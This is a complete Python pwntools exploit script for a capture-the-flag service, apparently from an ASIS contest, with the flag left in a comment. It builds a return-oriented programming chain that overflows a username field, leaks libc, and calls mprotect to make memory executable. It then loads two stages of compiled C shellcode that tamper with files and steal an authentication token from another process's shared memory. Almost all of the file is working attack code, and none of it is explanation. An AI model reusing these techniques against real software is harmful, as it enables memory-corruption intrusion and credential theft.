#!/usr/bin/env python3
from pwn import *

PERCENT_S_NEWLINE = 0x4019c8
POP_RSI_RET = 0x4017fa
POP_RDI_RET = 0x4019a3
PRINTF_CHK_GOT = 0x603090
RET = 0x401545
USERNAME_READER = 0x4014c0
PRINTF_CHK_LIBC = 0x131040
MPROTECT_LIBC = 0x11bb00
WORK_PAGE = 0x603000
STAGE3_ADDR = 0x603150
STAGE4_ADDR = 0x603800
PAGE_SIZE = 0x1000
POP_RSP_RET = 0x401063
MOV_RDI_R12_CALL_RBP = 0x40183c
POP_RBP_RET = 0x400f08
READ_LIBC = 0x111130


def cc(src):
    with tempfile.TemporaryDirectory() as workdir:
        with open(os.path.join(workdir, 'shellcode.c'), 'w') as fp:
            fp.write(src)
        with open(os.path.join(workdir, 'shellcode.lds'), 'w') as fp:
            fp.write('''
SECTIONS {
    .shellcode : {
        *(.text)
        *(.rodata*)
    }
    /DISCARD/ : { *(*) }
}
''')
        subprocess.check_call([
            'gcc',
            '-Os',
            '-fno-stack-protector',
            '-fcf-protection=none',
            '-Wall', '-Wextra', '-Werror',
            '-nostartfiles',
            '-Wl,--build-id=none',
            '-Wl,-script=shellcode.lds',
            'shellcode.c',
            '-o', 'shellcode.elf',
        ], cwd=workdir)
        subprocess.check_call([
            'objcopy',
            '-O', 'binary',
            '--only-section=.shellcode',
            'shellcode.elf', 'shellcode.bin',
        ], cwd=workdir)
        subprocess.check_call([
            'objdump',
            '-b', 'binary',
            '-m', 'i386:x86-64',
            '-D',
            'shellcode.bin',
        ], cwd=workdir)
        with open(os.path.join(workdir, 'shellcode.bin'), 'rb') as fp:
            return fp.read()


COMMON = r'''
#include <stddef.h>
#include <syscall.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

__attribute__((always_inline)) static inline long
xsyscall(int number, long arg1, long arg2, long arg3, long arg4, long arg5,
         long arg6) {
  register long rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long r10 asm("r10") = arg4;
  register long r8 asm("r8") = arg5;
  register long r9 asm("r9") = arg6;
  asm volatile("syscall"
               : "+r"(rax), "+r"(rdx)
               : "r"(rdi), "r"(rsi), "r"(r10), "r"(r8), "r"(r9)
               : "rcx", "r11", "memory", "cc");
  return rax;
}

__attribute__((always_inline)) static inline ssize_t
xread(int fd, void *buf, size_t count) {
  return xsyscall(__NR_read, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline)) static inline ssize_t
xwrite(int fd, const void *buf, size_t count) {
  return xsyscall(__NR_write, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline, noreturn)) static inline void
xexit(int status) {
  xsyscall(__NR_exit, status, 0, 0, 0, 0, 0);
  __builtin_unreachable();
}

__attribute__((always_inline)) static inline int
xrename(const char *oldpath, const char *newpath) {
  return xsyscall(__NR_rename, (long)oldpath, (long)newpath, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline pid_t
xfork(void) {
  return xsyscall(__NR_fork, 0, 0, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline pid_t
xgetpid(void) {
  return xsyscall(__NR_getpid, 0, 0, 0, 0, 0, 0);
}

struct kstat {
  dev_t st_dev;
  ino_t st_ino;
  nlink_t st_nlink;

  mode_t st_mode;
  uid_t st_uid;
  gid_t st_gid;
  unsigned int __pad0;
  dev_t st_rdev;
  off_t st_size;
  blksize_t st_blksize;
  blkcnt_t st_blocks;

  long st_atime_sec;
  long st_atime_nsec;
  long st_mtime_sec;
  long st_mtime_nsec;
  long st_ctime_sec;
  long st_ctime_nsec;
  long __unused[3];
};

__attribute__((always_inline)) static inline int
xstat(const char *pathname, struct kstat *statbuf) {
  return xsyscall(__NR_stat, (long)pathname, (long)statbuf, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline int
xshmget(key_t key, size_t size, int shmflg) {
  return xsyscall(__NR_shmget, key, size, shmflg, 0, 0, 0);
}

__attribute__((always_inline)) static inline void *
xshmat(int shmid, const void *shmaddr, int shmflg) {
  return (void *)xsyscall(__NR_shmat, shmid, (long)shmaddr, shmflg, 0, 0, 0);
}

__attribute__((always_inline)) static inline char *
xstrcpy(char *dest, const char *src) {
  int i = 0;
  while (src[i]) {
    dest[i] = src[i];
    i++;
  }
  dest[i] = 0;
  return dest;
}

__attribute__((always_inline)) static inline char *
xstrcat(char *dest, const char *src) {
  int i = __builtin_strlen(dest);
  xstrcpy(dest + i, src);
  return dest;
}

__attribute__((always_inline)) static inline char *
xitoa(int val, char *s, int radix) {
  static const char digits[] = "0123456789abcdef";
  int i = 0;
  do {
    s[i] = digits[val % radix];
    val /= radix;
    i++;
  } while (val);
  for (int j = 0; j < i / 2; j++) {
    s[j] ^= s[i - j - 1];
    s[i - j - 1] ^= s[j];
    s[j] ^= s[i - j - 1];
  }
  s[i] = 0;
  return s;
}

__attribute__((always_inline)) static inline int
xputs(const char *s) {
  xwrite(STDOUT_FILENO, s, __builtin_strlen(s));
  xwrite(STDOUT_FILENO, "\n", 1);
  return 0;
}
'''

STAGE4 = cc(COMMON + r'''
#define IPC_MAX_SIZE 0x100

typedef struct {
  int ready;
  pid_t src;
  pid_t dst;
  char data[1];
} IPC_packet;

__attribute__((used)) static void
shellcode(void) {
  void **frame = __builtin_frame_address(0);
  char **argv = (char **)(frame + 6);
  xputs("workdir=");
  xputs(argv[1]);
  char oldpath[100];
  xstrcpy(oldpath, argv[1]);
  xstrcat(oldpath, "/username");
  char newpath[100];
  xstrcpy(newpath, argv[1]);
  xstrcat(newpath, "/password");
  xputs("rename=");
  xputs(oldpath);
  xputs(newpath);
  int rename_ret = xrename(oldpath, newpath);
  xwrite(STDOUT_FILENO, &rename_ret, sizeof(rename_ret));
  pid_t username_pid = xgetpid();
  pid_t auth_pid = username_pid - 1;
  pid_t child_pid = username_pid + 1;
  pid_t password_pid = child_pid + 1; 
  pid_t token_pid = password_pid + 1;
  xputs("token_pid=");
  xwrite(STDOUT_FILENO, &token_pid, sizeof(token_pid));
  if (xfork() == 0) {
    char memfdpath[100];
    xstrcpy(memfdpath, "/proc/");
    char ibuf[10];
    xitoa(token_pid, ibuf, 10);
    xstrcat(memfdpath, ibuf);
    xstrcat(memfdpath, "/fd/3");
    xputs(memfdpath);
    struct kstat sb;
    while (1) {
      __builtin_memset(&sb, 0, sizeof(sb));
      if (xstat(memfdpath, &sb) == 0)
        break;
    }
    xputs("sb=");
    xwrite(STDOUT_FILENO, &sb, sizeof(sb));
    int shmid = -1;
    while (shmid < 0) {
      for (int proj_id = 0; proj_id < 0x100; proj_id++) {
        key_t key = (sb.st_ino & 0xffff) |
                    ((sb.st_dev & 0xff) << 16) |
                    ((proj_id & 0xff) << 24);
        shmid = xshmget(key, sizeof(IPC_packet) + IPC_MAX_SIZE, 0);
        if (shmid >= 0)
          break;
      }
    }
    xputs("shmid=");
    xwrite(STDOUT_FILENO, &shmid, sizeof(shmid));
    IPC_packet *packet = (IPC_packet *)xshmat(shmid, NULL, 0);
    xputs("packet=");
    xwrite(STDOUT_FILENO, &packet, sizeof(packet));
    while (packet->src != auth_pid ||
           packet->dst != token_pid ||
           packet->ready) {
    }
    xputs("token=");
    xwrite(STDOUT_FILENO, packet->data, 24);
    int rename2_ret = xrename(newpath, oldpath);
    xwrite(STDOUT_FILENO, &rename2_ret, sizeof(rename2_ret));
  }
  xexit(0);
}
''')

STAGE3 = cc(COMMON + f'''
#define STAGE4_ADDR 0x{STAGE4_ADDR:x}
#define STAGE4_LEN {len(STAGE4)}
''' + r'''
__attribute__((used)) static void
shellcode(void) {
  size_t pos = 0;
  while (pos < STAGE4_LEN) {
    ssize_t n_read = xread(
      STDIN_FILENO,
      (char *)(STAGE4_ADDR + pos),
      STAGE4_LEN - pos
    );
    pos += n_read;
  }
  ((void (*)(void))STAGE4_ADDR)();
}
''')


def connect():
    if args.LOCAL:
        if args.STRACE:
            return process(['strace', '-f', '-o', 'strace.out', './server.py'])
        else:
            return process(['./server.py'])
    else:
        return remote('69.90.132.134', 3317)


def scanf_ok(x):
    # https://reverseengineering.stackexchange.com/a/10596
    return b'\x09' not in x and \
           b'\x0a' not in x and \
           b'\x0b' not in x and \
           b'\x0c' not in x and \
           b'\x0d' not in x and \
           b'\x20' not in x


def send_stage1(tube):
    tube.recvuntil(b'Username: ')
    payload = flat({
        0: b'admin\0',
        0x38: b''.join((
            struct.pack('<QQ', POP_RDI_RET, 1),
            struct.pack('<QQ', POP_RSI_RET, PERCENT_S_NEWLINE),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, PRINTF_CHK_GOT, 0, 0),
            # call ___printf_chk; pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8a, 0, 0, 0),
            # it just so happens that r12 == IPC *, so we can restart
            struct.pack('<QQ', POP_RBP_RET, USERNAME_READER),
            struct.pack('<Q', MOV_RDI_R12_CALL_RBP),
        )),
    })
    assert scanf_ok(payload), payload.hex()
    # input('stage1')
    tube.sendline(payload)
    printf_chk, = struct.unpack('<Q', tube.recvn(6).ljust(8, b'\x00'))
    libc = printf_chk - PRINTF_CHK_LIBC
    print(f'libc: 0x{libc:x}')
    assert libc & 0xfff == 0
    return libc


def send_stage2(tube, libc):
    tube.recvuntil(b'Username: ')
    payload = flat({
        0: b'admin\0',
        0x38: b''.join((
            struct.pack('<QQ', POP_RDI_RET, WORK_PAGE),
            struct.pack('<QQ', POP_RSI_RET, PAGE_SIZE),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, 0x7, 0, 0),
            struct.pack('<Q', libc + MPROTECT_LIBC),
            struct.pack('<QQ', POP_RDI_RET, 0),
            struct.pack('<QQ', POP_RSI_RET, STAGE3_ADDR),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, len(STAGE3), 0, 0),
            struct.pack('<Q', RET),
            struct.pack('<Q', libc + READ_LIBC),
            struct.pack('<Q', RET),
            struct.pack('<Q', STAGE3_ADDR),
        ))
    })
    assert scanf_ok(payload)
    # input('stage2')
    tube.sendline(payload)


def pwn_once(tube):
    libc = send_stage1(tube)
    send_stage2(tube, libc)
    # input('stage3')
    tube.send(STAGE3)
    # input('stage4')
    tube.send(STAGE4)
    tube.recvuntil(b'workdir=\n')
    workdir = tube.recvline().strip().decode()
    print(f'workdir = {workdir}')
    tube.recvuntil(b'rename=\n')
    oldpath = tube.recvline().strip().decode()
    print(f'oldpath = {oldpath}')
    newpath = tube.recvline().strip().decode()
    print(f'newpath = {newpath}')
    rename_ret, = struct.unpack('<I', tube.recvn(4))
    print(f'rename_ret = 0x{rename_ret:x}')
    tube.recvuntil(b'token_pid=\n')
    token_pid, = struct.unpack('<I', tube.recvn(4))
    print(f'token_pid = {token_pid}')
    tube.recvuntil(b'Password: ')
    tube.sendline(b'admin')
    tube.recvuntil(b'token=\n')
    token = tube.recvn(24)
    print(f'token = {token}')
    tube.sendline(token)


def main():
    with connect() as tube:
        while True:
            pwn_once(tube)
            # ASIS{PWN_the_IPC_2_PWN_the_CORE}


if __name__ == '__main__':
    main()
